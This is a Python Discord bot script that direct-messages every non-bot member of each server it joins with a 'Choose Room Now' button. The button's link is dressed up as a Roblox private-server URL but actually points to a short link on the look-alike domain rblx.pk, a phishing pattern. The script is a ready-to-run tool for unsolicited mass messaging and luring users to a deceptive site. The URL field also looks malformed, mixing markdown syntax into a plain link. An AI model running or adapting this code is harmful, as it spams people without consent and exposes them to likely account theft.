import discord
import asyncio
import os

TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = discord.Client(intents=intents)

class View(discord.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(discord.ui.Button(
            label="🎮 Choose Room Now",
            url="[https*:*//www.roblox.com/games/136609432705944/Bubble-Battles?privateServerLinkCode=57651988341199565220149480502764](https://rblx.pk/Qezz-0lm)"
        ))

@bot.event
async def on_ready():
    print(f"✅ Bot {bot.user} aktif!")
    for guild in bot.guilds:
        print(f"🎉 Kirim DM ke {len(guild.members)} member di {guild.name}...")
        for member in guild.members:
            if member.bot:
                continue
            try:
                await member.send(
                    f"Hi {member.name}!\n\n"
            
                    "Choose your room and join now!",
                    view=View()
                )
                print(f"✅ DM ke {member.name}")
                await asyncio.sleep(0.5)
            except:
                print(f"❌ Gagal DM ke {member.name}")
    print("✅ SEMUA SELESAI!")
    await bot.close()

bot.run(TOKEN)
